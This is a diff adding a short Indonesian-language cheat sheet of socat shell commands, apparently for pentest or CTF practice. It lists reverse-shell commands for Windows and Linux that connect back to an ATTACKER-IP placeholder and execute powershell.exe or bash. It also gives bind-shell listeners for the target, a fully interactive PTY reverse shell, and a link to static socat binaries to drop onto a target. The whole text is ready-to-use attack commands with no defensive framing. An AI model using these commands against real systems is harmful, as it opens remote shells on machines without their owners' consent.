@@ -1,0 +1,29 @@
+[+] UNTUK RUN LISTENER DENGAN PORT DIBAWAH 1024, PERLU RUN MENGGUNAKAN SUDO
+
+
+# Reverse Shells
+listener:
+`socat TCP-L:PORT`
+
+target box untuk connect ke listener:
+1. `socat TCP:LOCAL-IP:LOCAL-PORT EXEC:powershell.exe,pipes` <- WINDOWS
+2. `socat TCP:LOCAL-IP:LOCAL-PORT EXEC:"bash -li"` <- LINUX
+
+
+# Bind Shells
+listener di target:
+1. `socat TCP-L:PORT EXEC:"bash -li"` <- LINUX
+2. `socat TCP-L:PORT EXEC:powershell.exe,pipes` <- WINDOWS
+
+local untuk konek ke target yang membuka listenerr:
+`socat TCP:TARGET-IP:TARGET-PORT -`
+
+
+## Fully stable linux
+listener:
+`socat TCP-L:PORT FILE:`tty`,raw,echo=0`
+tapi target harus ada socat yang terinstall, kita dapat beri socat ke target dari sini:
+` https://github.com/andrew-d/static-binaries/tree/master/binaries `
+
+target:
+`socat TCP:ATTACKER-IP:ATTACKER-PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
